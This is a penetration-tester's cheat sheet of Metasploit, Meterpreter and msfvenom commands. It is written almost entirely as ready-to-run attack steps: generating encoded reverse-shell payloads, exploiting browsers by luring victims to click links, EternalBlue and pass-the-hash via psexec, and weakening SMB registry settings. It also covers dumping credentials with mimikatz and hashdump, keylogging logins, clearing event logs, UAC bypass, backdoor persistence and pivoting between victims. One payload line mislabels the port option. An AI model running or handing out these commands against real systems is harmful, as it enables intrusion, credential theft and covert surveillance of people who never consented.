# Metasploit
##### Kill Job, but not Existing Meterpreter Shell
```bash
jobs -k [Job ID]
```

##### Search Modules with Grep
```bash
grep [Search String] search type:[Category]

grep smb search type:exploit
```

##### Get Module Information
```bash
use [Module Name]
info
```
### Routes
##### Add Route
```bash
meterpreter > ifconfig
# get [Subnet Mask of Exploited Target]

route add [IP] [Subnet Mask of Exploited Target] [Session ID]

use post/multi/manage/autoroute
set SESSION [Session ID]
set NETMASK [Subnet Mask of Exploited Target] # Optional.  Autoroute will check the sessions interfaces for subnets.
run
```

##### View Routes
```bash
route
Subnet       Netmask        Gateway
```

### Port Scan
```bash
search auxiliary/scanner/portscan

   #  Name                                  Disclosure Date  Rank    Check  Description
   -  ----                                  ---------------  ----    -----  -----------
   0  auxiliary/scanner/portscan/ftpbounce                   normal  No     FTP Bounce Port Scanner
   1  auxiliary/scanner/portscan/xmas                        normal  No     TCP "XMas" Port Scanner
   2  auxiliary/scanner/portscan/ack                         normal  No     TCP ACK Firewall Scanner
   3  auxiliary/scanner/portscan/tcp                         normal  No     TCP Port Scanner
   4  auxiliary/scanner/portscan/syn                         normal  No     TCP SYN Port Scanner
```

### SOCKS
##### Start SOCKS Proxy for Proxy Chains
Proxychains sends all of the traffic on the designated port to the local, metasploit, socks proxy.
Metasploit uses the configured routes to route the traffic to the desired host, over a meterpreter session.
```bash
cat /etc/proxychains4.conf

use auxiliary/server/socks_proxy
show options
# SRVPORT and VERSION must match settings in /etc/proxychains4.conf
set SRVPORT [Port from /etc/proxychains4.conf]
set VERSION [Version] # socks4 = 4a, socks5 = 5.
run
jobs

# Example command
proxychains nmap -sT -Pn -n [Target Host on another subnet]
proxychains ssh [Target Host on another subnet]

# Web Browser
# Mozilla Proxy Settings:
SOCKS Host:  [Attack Host]
SOCKS Proxy:  [Port from /etc/proxychains4.conf]
http://targethost.com
```

### Use with Other Applications

##### Use with Nessus
```bash
# Make sure that Postgres is running
service postgresql status
service postgresql start

load nessus
nessus_connect [Username]:[Password]@[Host]
nessus_help

# List current, Nessus scan.
nessus_scan_list

# List vulnerabilities found in a scan.
nessus_report_vulns [Scan ID]

# Import Nessus scan
nessus_db_import [Scan ID]

# List vulnerabilities from imported scan.
vulns
```

##### Nmap Scan with Metasploit
This will perform a nmap scan and feed the results into Metasploit.
```bash
# Make sure that Postgres is running
service postgresql status
service postgresql start

msfconsole
db_nmap
```

##### Upgrade Shell to Meterpreter Shell
```bash
search to_meterpreter
use post/multi/manage/shell_to_meterpreter
set SESSION [Session ID]
# LHOST will be IP of machine establishing the shell and may not be the Attack box, in the event of pivoting.
```

### [Resource Scripts](https://docs.rapid7.com/metasploit/resource-scripts/)
##### Create a Resource Script
```bash
# Save the commands executed since startup to the specified file.
makerc [Output Rc File]
```
##### Import a Resource Script
```bash
# From command prompt
msfconsole -r [Path to Resource Script]

# From inside of msfconsole
resource [Path to Resource Script] [param 1] [param 2] [param 3]
```

# Modules
* exploit/multi/script/web_delivery

# Meterpreter
### Listener
##### Start Handler with AutoRunScript to Migrate Process
```bash
use exploit/multi/handler
set AutoRunScript migrate -n SvcHost.exe
set LHOST [Attack Host]
set LPORT [Port]
run -j
```
##### Multi Handler
```bash
use exploit/multi/handler
set LHOST [Attack Host]
set LPORT [Port]
set PAYLOAD [Payload]
run -j
```
##### HTTPS Handler with PEM
```bash
use exploit/multi/handler
set LHOST [Attack Host]
set LPORT 443
set HandlerSSLCert [Path to PEM generated]
set StagerVerifySSLCert true
set PAYLOAD windows/x64/meterpreter/reverse_https
set PAYLOAD windows/meterpreter/reverse_https
run -j
```

### Processes
##### Get Processes
```bash
# All processes running on exploited machine
meterpreter > ps

# Filter processes by name
meterpreter > ps -S [Process Name]

# Process ID of current session
meterpreter > getpid
```
##### Migrate Process
```bash
# Migrate to process by ID
meterpreter > migrate [Process ID]

# Migrate to process by name
meterpreter > migrate -N [Process Name]
```

### Services
##### Get Services
```bash
meterpreter > service status-all
```
##### Upload File
```bash
upload [Source] [Destination]
```
##### Execute Shell Commands on Target
```bash
meterpreter > execute -f /bin/bash -i -c
# -i makes the process interactive
# -c channelizes the I/O
```
### Get System Information of Exploited Target
##### [Linux Commands](../Shells/Linux/README.md#System-Information)
##### [Windows Commands](../Shells/Windows/CMD/README.md#System-Information)
##### Sysinfo
```bash
meterpreter > sysinfo
```
##### Network Interfaces
```bash
meterpreter > ifconfig
```
##### Host Discovery
```bash
arp -a

use auxiliary/scanner/discovery/arp_sweep
```
##### Host Discovery (Windows)
```bash
use post/windows/gather/arp_scanner
```
##### Enumerate Services (Windows)
```bash
use post/windows/gather/enum_services
```
##### Enable RDP
```bash
meterpreter > run getgui -e
```
##### Enable RDP and Add User
```bash
meterpreter > run getgui -e -u [Username] -p [Password]
# User is created and added to both Administrators and Remote Desktop Users.
# Additionally, it creates a rule in the Windows firewall.
```
##### List Enabled Process Privileges
```bash
meterpreter > getprivs
```
##### List Windows Privileges and UAC Status
```bash
use post/windows/gather/win_privs
set SESSION [Session ID]
```

### Migrate to Another Process 
##### Migrate to Another Process Automatically (Windows)
```bash
# As script
run post/windows/manage/migrate

# As module
use post/windows/manage/migrate
set SESSION [Session ID]
run
```
##### Migrate to Another Process ID
```bash
migrate [Process ID]
migrate -P [Process ID]
```
##### Migrate to Another Process Name
```bash
migrate -N [Process Name].[Extension]
```

### Get Windows Credentials
##### Dump Clear Text Credentials with mimikatz
```bash
sessions -i [Session ID]
load mimikatz
wdigest
```
##### Dump Clear Text Credentials and Hashes
```bash
sessions -i [Session ID]
load kiwi
help
creds_all
```
##### Dump the contents of the SAM database
```bash
# It may be necessary to migrate to a service process, if not SYSTEM account.
run hashdump
# It is possible to just call "hashdump," but that may fail, even as SYSTEM, where as "run hashdump" may succeed.
```
##### Windows Gather Hashes and Tokens
```bash
# This module harvests credentials found on the host and stores them in the database.
use post/windows/gather/credentials/credential_collector
```
##### Windows Gather Local User Account Password Hashes (Registry)
```bash
# This module will dump the local user accounts from the SAM database using the registry
use post/windows/gather/hashdump
# Stores hashes both in the database and the loot folder.
```
##### Windows Gather Local and Domain Controller Account Password Hashes
```bash
# This will dump local accounts from the SAM Database. If the target host is a Domain Controller, it will dump the Domain Account 
# Database using the proper technique depending on privilege level, OS and role of the host.
use post/windows/gather/smart_hashdump
# Stores hashes both in the database and the loot folder.
```
##### See Gathered Credentials
```bash
creds

loot
```

### Keylog
##### Windows Login Credentials
* keyscan_start - Migrate session to winlogon.exe
```bash
meterpreter > migrate -N winlogon.exe
meterpreter > keyscan_start
meterpreter > keyscan_dump
meterpreter > keyscan_stop
```
* keylogrecorder
```bash
meterpreter > keylogrecorder -c 1
```
##### User Keystrokes in Applications
* keyscan_start - Migrate session to explorer.exe
```bash
meterpreter > migrate -N explorer.exe
meterpreter > keyscan_start
meterpreter > keyscan_dump
meterpreter > keyscan_stop
```
* keylogrecorder
```bash
meterpreter > keylogrecorder -c 0
```

### Port Forwarding
##### portfwd
| Flag | Description |
|------|-------------|
| -h | Help banner.
| -i [opt] | Index of the port forward entry to interact with (see the "list" command).
| -l [opt] | Forward: local port to listen on. Reverse: local port to connect to.
| -L [opt] | Forward: local host to listen on (optional). Reverse: local host to connect to.
| -p [opt] | Forward: remote port to connect to. Reverse: remote port to listen on.
| -r [opt] | Forward: remote host to connect to.
| -R       | Indicates a reverse port forward.

```bash
meterpreter > portfwd add -l [Listening Port] -p [Remote Port] -r [Remote Host]
meterpreter > portfwd list
```
##### post/windows/manage/portproxy
```bash
use post/windows/manage/portproxy
set CONNECT_ADDRESS [Remote IP for Forwarding]
set CONNECT_PORT [Remote Port for Forwarding]
set LOCAL_ADDRESS [Local IP for Listening]
set LOCAL_PORT [Local Port for Listening]
set SESSION [Session ID]
run
```

### Windows Commands
##### Clear System Logs
```bash
meterpreter > clearev
```

### HTTPS Reverse Shell with Impersonate SSL
```bash
use auxiliary/gather/impersonate_ssl
set RHOST www.microsoft.com
run

use payload/windows/x64/meterpreter/reverse_https
use payload/windows/meterpreter/reverse_https
set LHOST [Attack Host]
set LPORT 443
set HandlerSSLCert [Path to PEM generated]
set StagerVerifySSLCert true
generate -t exe -f [Path to payload file]
```

# msfvenom
### Framework Encoders [--encoder ]
```bash
msfvenom --list encoders
```
| Name | Rank | Description |
|------|------|-------------|
| cmd/brace | low | Bash Brace Expansion Command Encoder
| cmd/echo | good | Echo Command Encoder
| cmd/generic_sh | manual | Generic Shell Variable Substitution Command Encoder
| cmd/ifs | low | Bourne ${IFS} Substitution Command Encoder
| cmd/perl | normal | Perl Command Encoder
| cmd/powershell_base64 | excellent | Powershell Base64 Command Encoder
| cmd/printf_php_mq | manual | printf(1) via PHP magic_quotes Utility Command Encoder
| generic/eicar | manual | The EICAR Encoder
| generic/none | normal | The "none" Encoder
| mipsbe/byte_xori | normal | Byte XORi Encoder
| mipsbe/longxor | normal | XOR Encoder
| mipsle/byte_xori | normal | Byte XORi Encoder
| mipsle/longxor | normal | XOR Encoder
| php/base64 | great | PHP Base64 Encoder
| ppc/longxor | normal | PPC LongXOR Encoder
| ppc/longxor_tag | normal | PPC LongXOR Encoder
| ruby/base64 | great | Ruby Base64 Encoder
| sparc/longxor_tag | normal | SPARC DWORD XOR Encoder
| x64/xor | normal | XOR Encoder
| x64/xor_context | normal | Hostname-based Context Keyed Payload Encoder
| x64/xor_dynamic | normal | Dynamic key XOR Encoder
| x64/zutto_dekiru | manual | Zutto Dekiru
| x86/add_sub | manual | Add/Sub Encoder
| x86/alpha_mixed | low | Alpha2 Alphanumeric Mixedcase Encoder
| x86/alpha_upper | low | Alpha2 Alphanumeric Uppercase Encoder
| x86/avoid_underscore_tolower | manual | Avoid underscore/tolower
| x86/avoid_utf8_tolower | manual | Avoid UTF8/tolower
| x86/bloxor | manual | BloXor - A Metamorphic Block Based XOR Encoder
| x86/bmp_polyglot | manual | BMP Polyglot
| x86/call4_dword_xor | normal | Call+4 Dword XOR Encoder
| x86/context_cpuid | manual | CPUID-based Context Keyed Payload Encoder
| x86/context_stat | manual | stat(2)-based Context Keyed Payload Encoder
| x86/context_time | manual | time(2)-based Context Keyed Payload Encoder
| x86/countdown | normal | Single-byte XOR Countdown Encoder
| x86/fnstenv_mov | normal | Variable-length Fnstenv/mov Dword XOR Encoder
| x86/jmp_call_additive | normal | Jump/Call XOR Additive Feedback Encoder
| x86/nonalpha | low | Non-Alpha Encoder
| x86/nonupper | low | Non-Upper Encoder
| x86/opt_sub | manual | Sub Encoder (optimised)
| x86/service | manual | Register Service
| x86/shikata_ga_nai | excellent | Polymorphic XOR Additive Feedback Encoder
| x86/single_static_bit | manual | Single Static Bit
| x86/unicode_mixed | manual | Alpha2 Alphanumeric Unicode Mixedcase Encoder
| x86/unicode_upper | manual | Alpha2 Alphanumeric Unicode Uppercase Encoder
| x86/xor_dynamic | normal | Dynamic key XOR Encoder

### Framework Platforms [--platform ]
```bash
msfvenom --list platforms
```
| Name |
|------|
| aix
| android
| apple_ios
| brocade
| bsd
| bsdi
| cisco
| firefox
| freebsd
| hardware
| hpux
| irix
| java
| javascript
| juniper
| linux
| mainframe
| multi
| netbsd
| netware
| nodejs
| openbsd
| osx
| php
| python
| r
| ruby
| solaris
| unifi
| unix
| unknown
| windows

### Formats
```bash
msfvenom --list formats
```
##### Framework Executable Formats [--format ]
| Name |
|------|
| asp
| aspx
| aspx-exe
| axis2
| dll
| elf
| elf-so
| exe
| exe-only
| exe-service
| exe-small
| hta-psh
| jar
| jsp
| loop-vbs
| macho
| msi
| msi-nouac
| osx-app
| psh
| psh-cmd
| psh-net
| psh-reflection
| vba
| vba-exe
| vba-psh
| vbs
| war

##### Framework Transform Formats [--format ]
| Name |
|------|
| bash
| c
| csharp
| dw
| dword
| hex
| java
| js_be
| js_le
| num
| perl
| pl
| powershell
| ps1
| py
| python
| raw
| rb
| ruby
| sh
| vbapplication
| vbscript

### Framework Architectures [--arch ]
```bash
msfvenom --list archs
```

| Name |
|------|
| aarch64
| armbe
| armle
| cbea
| cbea64
| cmd
| dalvik
| firefox
| java
| mips
| mips64
| mips64le
| mipsbe
| mipsle
| nodejs
| php
| ppc
| ppc64
| ppc64le
| ppce500v2
| python
| r
| ruby
| sparc
| sparc64
| tty
| x64
| x86
| x86_64
| zarch

### Framework Encryption Formats [--encrypt ]
```bash
msfvenom --list encrypt
```

| Name |
|------|
| aes256
| base64
| rc4
| xor

### Payload Options
```bash
# msfvenom -p PAYLOAD --list-options
$ msfvenom -p linux/x86/meterpreter/reverse_tcp --list-options
```

###

##### Windows Meterpreter Reverse Shell with Encoding
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=[Attack Host] LHOST=[Port] -f exe -e x86/shikata_ga_nai -o [Outpuf File]
```
##### Windows Meterpreter HTTPS Reverse Shell
```bash
# As EXE
msfvenom -p windows/meterpreter/reverse_https LHOST=[Attack Host] LPORT=443 -f exe -o payload.exe

# As DLL
msfvenom -p windows/meterpreter/reverse_https LHOST=[Attack Host] LPORT=443 -f dll -o payload.dll
```

# Client-Side Exploits
### Exploit Client with Adobe Flash
##### UAF
```bash
msfconsole -q
use exploit/multi/browser/adobe_flash_hacking_team_uaf
show options
set LHOST [Attack Host]

show targets
set TARGET [Target ID]

show payloads
set PAYLOAD linux/x86/meterpreter/reverse_tcp
set PAYLOAD windows/meterpreter/reverse_tcp

exploit

# Get victim to click the link that is generated by Metasploit.
```

### Exploit Client with Firefox
##### PDFJS
```bash
msfconsole -q
use exploit/multi/browser/firefox_pdfjs_privilege_escalation
show options

show targets

show payloads
set PAYLOAD payload/firefox/shell_reverse_tcp
exploit

# Get victim to click the link that is generated by Metasploit.
```

# PowerShell
##### Load PowerShell
```bash
meterpreter > load powershell
meterpreter > powershell_shell
```

# Remote Exploits
##### Remoting
```bash
use exploit/windows/local/powershell_remoting
set SESSION [Session ID]
set SMBUSER [Username]
set SMBPASS [Password]
set SMBDOMAIN [Domain Name]
set RHOSTS [Target Host]
set payload windows/x64/meterpreter/reverse_tcp
set LHOST [Listening Host]
set LPORT [Port]
exploit -j
```
##### EternalBlue
```bash
msfconsole -q

# Scan target to determine if it is vulnerable to EternalBlue.
use auxiliary/scanner/smb/smb_ms17_010 
show options
set RHOSTS [Target Host]
# Set SMBDomain, SMBUser, SMBPass settings, if available.
run

use windows/smb/ms17_010_eternalblue
show options
set RHOSTS [Target Host]
# Set SMBDomain, SMBUser, SMBPass settings, if available.
exploit
```

# Services
### Finger
##### Enumerate Users with Finger
```bash
msfconsole -q
search finger
use auxiliary/scanner/finger/finger_users
use 1
show options

set RHOSTS [SMTP Host]
set USERS_FILE [Wordlist]
run
```

### SMB
##### Establish Reverse Shell with SMB
```bash
msfconsole
use exploit/windows/smb/psexec
set RHOSTS [Target Host]
set SMBUser [Username]
set SMBPass [Password] # SMBPass can be the clear text password or the password hash.  
set PAYLOAD /windows/meterpreter/reverse_tcp
set LHOST [Attack Host]
exploit

# Error STATUS_ACCESS_DENIED usually means user does not have access to administrative shares.
```
Pass the hash may only work for Administrator RID 500 and not for accounts in the Administrators group.
In which case, the remote system will need two registry entries:
##### Update Registry to Allow SMB Access
```powershell
PS> Set-ItemProperty -Path HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System -Name LocalAccountTokenFilterPolicy -Value 1 -Type DWORD
PS> Set-ItemProperty -Path HKLM:\System\CurrentControlSet\Services\LanManServer\Parameters -Name RequireSecuritySignature -Value 0 -Type DWORD
```
```cmd
C:\> reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v LocalAccountTokenFilterPolicy /t DWORD /d 1 /f
C:\> reg add "HKEY_LOCAL_MACHINE\System\CurrentControlSet\Services\LanManServer\Parameters" /v RequireSecuritySignature /t DWORD /d 0 /f
```
```cmd
meterpreter > reg setval -k 'HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System' -v LocalAccountTokenFilterPolicy -t DWORD -d 1
meterpreter > reg setval -k 'HKEY_LOCAL_MACHINE\System\CurrentControlSet\Services\LanManServer\Parameters' -v RequireSecuritySignature -t DWORD -d 0
```
###### [PSExec Pass the Hash](https://www.offensive-security.com/metasploit-unleashed/psexec-pass-hash/)
###### [Pass-the-Hash Is Dead: Long Live LocalAccountTokenFilterPolicy](https://blog.harmj0y.net/redteaming/pass-the-hash-is-dead-long-live-localaccounttokenfilterpolicy/)

##### Establish Reverse Shell from Second Victim with SMB
```bash
# Add route to Victim 2's subnet, pointing to Victim 1's session.
use post/multi/manage/autoroute
set SESSION [Victim 1's Session #]
set SUBNET [Victim 2's Subnet] # Optional.  Autoroute will check the sessions interfaces for subnets.
run

use exploit/windows/smb/psexec
set RHOSTS [Victim 2 Host]
set SMBUser [Username]
set SMBPass [Password] # SMBPass can be the clear text password or the password hash.  
set PAYLOAD /windows/meterpreter/reverse_tcp
set LHOST [Attack Host]
exploit
```
##### Establish Reverse Shell from Second Victim with SMB using Proxy
```bash
# Add routes to both victims, pointing to Victim 1's session.
use post/multi/manage/autoroute
set SESSION [Victim 1's Session ID]
set SUBNET [Victim 1's Subnet] # Optional.  Autoroute will check the sessions interfaces for subnets.
set SUBNET [Victim 2's Subnet] # Optional.  Autoroute will check the sessions interfaces for subnets.
run

use exploit/windows/smb/psexec
set RHOSTS [Victim 2 Host]
set SMBUser [Username]
set SMBPass [Password] # SMBPass can be the clear text password or the password hash.  
set PAYLOAD /windows/meterpreter/reverse_tcp
set LHOST [Victim 1 Host]
exploit
```

##### Capture SMB Hashes
```bash
msfconsole
use auxiliary/server/capture/smb
show options

# Do not change the challenge, as there are rainbow tables built for this challenge.
set JOHNWPFILE hashes
run
```

##### SMB Relay
```bash
msfconsole
use exploit/windows/smb/smb_relay
show options

set LHOST [Attack Host]
set SMBHOST <SMB Server Host
run
```

### SMTP
##### Enumerate SMTP Users
```bash
msfconsole -q
search smtp_enum

use auxiliary/scanner/smtp/smtp_enum
# or
use 0
show options

set RHOSTS [SMTP Host]
set USER_FILE [Wordlist]
run
```

### SSH
##### Login SSH
```bash
use auxiliary/scanner/ssh/ssh_login
```

### VNC
##### Reverse Shell with VNC
```bash
msfconsole -q
use exploit/multi/vnc/vnc_keyboard_exec
show options

set RHOSTS [Target Host]
set PASSWORD [Password]

show targets
set TARGET [Target ID]

show payloads
set PAYLOAD linux/x86/meterpreter/reverse_tcp
set PAYLOAD windows/meterpreter/reverse_tcp
```

# Escalate Privileges - Linux
##### [Get System Information](#Get-System-Information-of-Exploited-Target)
##### [Linux Modules]
|  # | Name | Description |
|----|------|-------------|
|  0 | exploit/linux/local/abrt_raceabrt_priv_esc | ABRT raceabrt Privilege Escalation
|  1 | exploit/linux/local/abrt_sosreport_priv_esc | ABRT sosreport Privilege Escalation
|  2 | exploit/linux/local/af_packet_chocobo_root_priv_esc | AF_PACKET chocobo_root Privilege Escalation
|  3 | exploit/linux/local/af_packet_packet_set_ring_priv_esc | AF_PACKET packet_set_ring Privilege Escalation
|  4 | exploit/linux/local/apt_package_manager_persistence | APT Package Manager Persistence
|  5 | exploit/linux/local/asan_suid_executable_priv_esc | AddressSanitizer (ASan) SUID Executable Privilege Escalation
|  6 | exploit/linux/local/apport_abrt_chroot_priv_esc | Apport / ABRT chroot Privilege Escalation
|  7 | exploit/linux/local/autostart_persistence | Autostart Desktop Item Persistence
|  8 | exploit/linux/local/bash_profile_persistence | Bash Profile Persistence
|  9 | exploit/linux/local/cpi_runrshell_priv_esc | Cisco Prime Infrastructure Runrshell Privilege Escalation
| 10 | exploit/linux/local/cron_persistence | Cron Persistence
| 11 | exploit/linux/local/ntfs3g_priv_esc | Debian/Ubuntu ntfs-3g Local Privilege Escalation
| 12 | exploit/linux/local/desktop_privilege_escalation | Desktop Linux Password Stealer and Privilege Escalation
| 13 | exploit/linux/local/diamorphine_rootkit_signal_priv_esc | Diamorphine Rootkit Signal Privilege Escalation
| 14 | exploit/linux/local/docker_runc_escape | Docker Container Escape Via runC Overwrite
| 15 | exploit/linux/local/docker_daemon_privilege_escalation | Docker Daemon Privilege Escalation
| 16 | exploit/linux/local/docker_privileged_container_escape | Docker Privileged Container Escape
| 17 | exploit/linux/local/exim4_deliver_message_priv_esc | Exim 4.87 - 4.91 Local Privilege Escalation
| 18 | exploit/linux/local/hp_xglance_priv_esc | HP Performance Monitoring xglance Priv Esc
| 19 | exploit/linux/local/hp_smhstart | HP System Management Homepage Local Privilege Escalation
| 20 | exploit/linux/local/juju_run_agent_priv_esc | Juju-run Agent Privilege Escalation
| 21 | exploit/linux/local/kloxo_lxsuexec | Kloxo Local Privilege Escalation
| 22 | exploit/linux/local/libuser_roothelper_priv_esc | Libuser roothelper Privilege Escalation
| 23 | exploit/linux/local/bpf_sign_extension_priv_esc | Linux BPF Sign Extension Local Privilege Escalation
| 24 | exploit/linux/local/bpf_priv_esc | Linux BPF doubleput UAF Privilege Escalation
| 25 | exploit/linux/local/netfilter_priv_esc_ipv4 | Linux Kernel 4.6.3 Netfilter Privilege Escalation
| 26 | exploit/linux/local/sock_sendpage | Linux Kernel Sendpage Local Privilege Escalation
| 27 | exploit/linux/local/ufo_privilege_escalation | Linux Kernel UDP Fragmentation Offset (UFO) Privilege Escalation
| 28 | exploit/linux/local/recvmmsg_priv_esc | Linux Kernel recvmmsg Privilege Escalation
| 29 | exploit/linux/local/nested_namespace_idmap_limit_priv_esc | Linux Nested User Namespace idmap Limit Local Privilege Escalation
| 30 | exploit/linux/local/pkexec | Linux PolicyKit Race Condition Privilege Escalation
| 31 | exploit/linux/local/ptrace_traceme_pkexec_helper | Linux Polkit pkexec helper PTRACE_TRACEME local root exploit
| 32 | exploit/linux/local/cve_2021_3490_ebpf_alu32_bounds_check_lpe | Linux eBPF ALU32 32-bit Invalid Bounds Tracking LPE
| 33 | exploit/linux/local/udev_netlink | Linux udev Netlink Local Privilege Escalation
| 34 | exploit/linux/local/su_login | Login to Another User with Su on Linux / Unix Systems
| 35 | exploit/linux/local/omniresolve_suid_priv_esc | Micro Focus (HPE) Data Protector SUID Privilege Escalation
| 36 | exploit/linux/local/cve_2021_38648_omigod | Microsoft OMI Management Interface Authentication Bypass
| 37 | exploit/linux/local/netfilter_xtables_heap_oob_write_priv_esc | Netfilter x_tables Heap OOB Write Privilege Escalation
| 38 | exploit/linux/local/network_manager_vpnc_username_priv_esc | Network Manager VPNC Username Privilege Escalation
| 39 | exploit/linux/local/overlayfs_priv_esc | Overlayfs Privilege Escalation
| 40 | exploit/linux/local/pihole_remove_commands_lpe | Pi-Hole Remove Commands Linux Priv Esc
| 41 | exploit/linux/local/polkit_dbus_auth_bypass | Polkit D-Bus Authentication Bypass
| 42 | exploit/linux/local/rds_atomic_free_op_null_pointer_deref_priv_esc | Reliable Datagram Sockets (RDS) rds_atomic_free_op NULL pointer dereference Privilege Escalation
| 43 | exploit/linux/local/rds_rds_page_copy_user_priv_esc | Reliable Datagram Sockets (RDS) rds_page_copy_user Privilege Escalation
| 44 | exploit/linux/local/reptile_rootkit_reptile_cmd_priv_esc | Reptile Rootkit reptile_cmd Privilege Escalation
| 45 | exploit/linux/local/servu_ftp_server_prepareinstallation_priv_esc | Serv-U FTP Server prepareinstallation Privilege Escalation
| 46 | exploit/linux/local/service_persistence | Service Persistence
| 47 | exploit/linux/local/sophos_wpa_clear_keys | Sophos Web Protection Appliance clear_keys.pl Local Privilege Escalation
| 48 | exploit/linux/local/sudo_baron_samedit | Sudo Heap-Based Buffer Overflow
| 49 | exploit/linux/local/systemtap_modprobe_options_priv_esc | SystemTap MODPROBE_OPTIONS Privilege Escalation
| 50 | exploit/linux/local/ueb_bpserverd_privesc | Unitrends Enterprise Backup bpserverd Privilege Escalation
| 51 | exploit/linux/local/vmware_mount | VMWare Setuid vmware-mount Unsafe popen(3)
| 52 | exploit/linux/local/vmware_alsa_config | VMware Workstation ALSA Config File Local Privilege Escalation
| 53 | exploit/linux/local/yum_package_manager_persistence | Yum Package Manager Persistence
| 54 | exploit/linux/local/zpanel_zsudo | ZPanel zsudo Local Privilege Escalation Exploit
| 55 | exploit/linux/local/blueman_set_dhcp_handler_dbus_priv_esc | blueman set_dhcp_handler D-Bus Privilege Escalation
| 56 | exploit/linux/local/glibc_origin_expansion_priv_esc | glibc '$ORIGIN' Expansion Privilege Escalation
| 57 | exploit/linux/local/glibc_realpath_priv_esc | glibc 'realpath()' Privilege Escalation
| 58 | exploit/linux/local/glibc_ld_audit_dso_load_priv_esc | glibc LD_AUDIT Arbitrary DSO Load Privilege Escalation
| 59 | exploit/linux/local/ktsuss_suid_priv_esc | ktsuss suid Privilege Escalation
| 60 | exploit/linux/local/lastore_daemon_dbus_priv_esc | lastore-daemon D-Bus Privilege Escalation
| 61 | exploit/linux/local/ptrace_sudo_token_priv_esc | ptrace Sudo Token Privilege Escalation
| 62 | exploit/linux/local/rc_local_persistence | rc.local Persistence

```bash
use exploit/linux/local
```

# Escalate Privileges - Windows
##### [Get System Information](#Get-System-Information-of-Exploited-Target)
##### Escalate Privileges with GetSystem (Windows)
| -t | Type |
|----|------|
| 0  | All techniques available
| 1  | Named Pipe Impersonation (In Memory/Admin)
| 2  | Named Pipe Impersonation (Dropper/Admin)
| 3  | Token Duplication (In Memory/Admin)
| 4  | Named Pipe Impersonation (RPCSS variant)
```bash
meterpreter > getsystem
```
##### Windows Gather Privileges Enumeration
```bash
use post/windows/gather/win_privs
set SESSION [Session ID]
run
```
### UAC
##### Escalate Privileges Under UAC
```bash
# Determine if UAC is enabled, if so, getsystem will fail
use post/windows/gather/win_privs
set SESSION [Session ID]
run

# If UAC is enabled
search bypassuac
use bypassuac_injection
set SESSION [Session ID]
# The target and the payload must match the Windows architecture (x86 or x64).
show targets
set TARGET [Target ID]
set PAYLOAD windows/meterpreter/reverse_tcp or windows/x64/meterpreter/reverse_tcp
exploit

getsystem
```
##### Escalate with Incognito
```bash
# From Meterpreter shell
use incognito
list_tokens -u
impersonate_token [Token Name] # Escape \'s.
```
##### Exploit Unquoted Service Paths
```bash
use exploit/windows/local/unquoted_service_path
set SESSION [Session ID]
exploit
```

# Persistence
### Create Windows Backdoor
```bash
search persistence windows

use exploit/windows/local/persistence
set SESSION [Session ID]
set STARTUP [Startup Type]
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST [Attack Host]
set LPORT [Port]
exploit
```

# Cheatsheets
##### [MSFVenom Reverse Shell Payload Cheatsheet (with & without Meterpreter)](https://infinitelogins.com/2020/01/25/msfvenom-reverse-shell-payload-cheatsheet/)

# References
##### [Official Documentation](https://docs.rapid7.com/metasploit/)

##### [Deep Dive Into Stageless Meterpreter Payloads](https://www.rapid7.com/blog/post/2015/03/25/stageless-meterpreter-payloads/)

##### [Metasploit Module Library](https://www.infosecmatter.com/metasploit-module-library/)